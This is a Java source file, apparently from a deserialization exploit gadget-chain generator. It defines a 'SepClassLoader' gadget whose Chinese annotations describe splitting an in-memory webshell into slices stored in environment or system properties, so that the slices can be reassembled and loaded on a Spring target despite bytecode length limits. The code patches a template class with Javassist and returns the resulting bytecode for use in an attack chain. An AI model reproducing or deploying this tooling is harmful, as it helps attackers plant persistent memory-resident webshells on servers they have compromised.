package com.ar3h.plugin.fr.gadget.impl.bytecode.common;

import com.ar3h.chains.common.Gadget;
import com.ar3h.chains.common.GadgetChain;
import com.ar3h.chains.common.GadgetContext;
import com.ar3h.chains.common.annotations.GadgetAnnotation;
import com.ar3h.chains.common.annotations.GadgetTags;
import com.ar3h.chains.common.param.Param;
import com.ar3h.chains.common.util.JavassistHelper;
import com.ar3h.plugin.fr.gadget.impl.bytecode.common.template.SepClassLoaderBytecode;

@GadgetTags(
        tags = {"Bytecode", "Spring", "END"}
)
@GadgetAnnotation(
        name = "字节码切片加载",
        description = "适用于字节码长度限制, 通过环境变量获取内存马切片并加载",
        authors = {"se1zer"}
)
public class SepClassLoader implements Gadget {
    @Param(
            name = "写入环境变量时该参数为key:property_prefix+num，加载内存马时为切片个数num，从1开始"
    )
    public int num = 2;
    @Param(
            name = "环境变量前缀"
    )
    public String property_prefix = "data";

    @Param(
            name = "是否写入环境变量"
    )
    public boolean write = false;

    @Param(
            name = "内存马切片",
            requires = false
    )
    public String data = "";

    public SepClassLoader() {
    }

    public byte[] getObject(){
        JavassistHelper javassistHelper = new JavassistHelper(SepClassLoaderBytecode.class);
        javassistHelper.modifyBooleanField("write", this.write);
        javassistHelper.modifyStringField("data", this.data);
        javassistHelper.modifyIntField("num", this.num);
        javassistHelper.modifyStringField("property_prefix", this.property_prefix);
        return javassistHelper.getBytecode();
    }

    public Object invoke(GadgetContext context, GadgetChain chain) throws Exception {
        chain.doCreate(context);
        return this.getObject();
    }
}
